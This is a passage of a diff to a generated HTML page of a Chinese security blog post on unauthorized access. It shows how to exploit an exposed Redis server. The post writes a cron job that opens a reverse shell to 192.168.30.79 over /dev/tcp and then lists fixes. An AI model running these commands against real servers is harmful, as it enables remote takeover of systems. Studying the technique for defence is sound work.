+make<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>修改配置文件</p>
+<pre class="line-numbers language-none"><code class="language-none">vi redis.conf
 bind 127.0.0.1 加上#
-protected-mode yes  改为no
-</code></pre><p>在配置文件目录下启动</p>
-<pre><code>./src/redis-server redis.conf
-</code></pre><p>启动后显示如下：</p>
-<p><img src="\2019\06\越权-未授权访问\1560837844041.png" alt="1560837844041"></p>
+protected-mode yes  改为no<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>在配置文件目录下启动</p>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;src&#x2F;redis-server redis.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>启动后显示如下：</p>
+<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560837844041.png" alt="1560837844041"></p>
 <p>通过reids命令可以查看基本信息</p>
-<p><img src="\2019\06\越权-未授权访问\1560837899368.png" alt="1560837899368"></p>
+<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560837899368.png" alt="1560837899368"></p>
 <p>尝试反弹shell到指定地址</p>
-<pre><code>set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.30.79/2333 0&gt;&amp;1\n&quot;
-config set dir /var/spool/cron/
+<pre class="line-numbers language-none"><code class="language-none">set x &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.30.79&#x2F;2333 0&gt;&amp;1\n&quot;
+config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;
 config set dbfilename root
-save
-</code></pre><p>或者采用gopher协议，直接利用curl一条命令执行</p>
-<p><img src="\2019\06\越权-未授权访问\1560840948082.png" alt="1560840948082"></p>
+save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>或者采用gopher协议，直接利用curl一条命令执行</p>
+<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560840948082.png" alt="1560840948082"></p>
 <h2 id="0x08、漏洞修复"><a href="#0x08、漏洞修复" class="headerlink" title="0x08、漏洞修复"></a>0x08、漏洞修复</h2><p>1、验证需要从前端获取的参数，比如用户ID和角色权限名，对于需要根据前台请求来返回数据的参数进行权限效验。</p>
 <p>2、对于固定返回信息可以使用特定链接地址返回，同时采用不可预测地址，如：getuserinfo_snhx.php</p>
 <p>3、对于需要修改、新增等功能进行判断，根据当前seesion判断用户，参数中只传输修改的用户信息。</p>
@@ -254,11 +278,11 @@ save
           <br><br>
               
                 <div class="license-wrapper">
-                    <p>原文作者：<a href="">Misaki</a>
-                    <p>原文链接：<a href="/2019/06/越权-未授权访问/">/2019/06/越权-未授权访问/</a>
-                    <p>发表日期：<a href="/2019/06/越权-未授权访问/">June 18th 2019, 11:27:13 am</a>
-                    <p>更新日期：<a href="/2019/06/越权-未授权访问/">June 18th 2019, 3:00:48 pm</a>
-                    <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+                    <p>原文作者：<a href="https://misakikata.github.io">Misaki</a>
+                    <p>原文链接：<a href="https://misakikata.github.io/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">https://misakikata.github.io/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</a>
+                    <p>发表日期：<a href="https://misakikata.github.io/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">June 18th 2019, 11:27:13 am</a>
+                    <p>更新日期：<a href="https://misakikata.github.io/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">June 18th 2019, 3:00:48 pm</a>
+                    <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
                 </div>
               
           <br><br>
@@ -296,7 +320,7 @@ save
     <script>               
         var disqus_shortname = '';
         var disqus_config = function () {
-            this.page.url = '/2019/06/越权-未授权访问/'; 
+            this.page.url = 'https://misakikata.github.io/2019/06/越权-未授权访问/'; 
             this.page.identifier = '/2019/06/越权-未授权访问/';
         };
         (function() { 
@@ -307,7 +331,7 @@ save
             (d.head || d.body).appendChild(s);
         })();
     </script>
-    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
 </div>
         
     
@@ -327,16 +351,32 @@ save
         </div>
 </footer>
       <!--   Core JS Files   -->
-      <script src="/js/core/jquery.min.js?v=3.2.1"></script>
-      <script src="/js/main.js"></script>
-      <script src="/js/core/popper.min.js"></script>
-      <script src="/js/core/bootstrap-material-design.min.js"></script>
-      <script src="/js/plugins/moment.min.js"></script>
-      <script src="/js/material-kit.min.js?v=2.0.5"></script>
+      
+<script src="/js/core/jquery.min.js?v=3.2.1.js"></script>
+
+      
+<script src="/js/main.js"></script>
+
+      
+<script src="/js/core/popper.min.js"></script>
+
+      
+<script src="/js/core/bootstrap-material-design.min.js"></script>
+
+      
+<script src="/js/plugins/moment.min.js"></script>
+
+      
+<script src="/js/material-kit.min.js?v=2.0.5.js"></script>
+
       
         <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
-        <script src="/js/post.js"></script>
-        <script src="/js/plugins/prettify.js"></script>
+        
+<script src="/js/post.js"></script>
+
+        
+<script src="/js/plugins/prettify.js"></script>
+
         <script>
             $(document).ready(function(){
                 $('pre').addClass('prettyprint linenums');
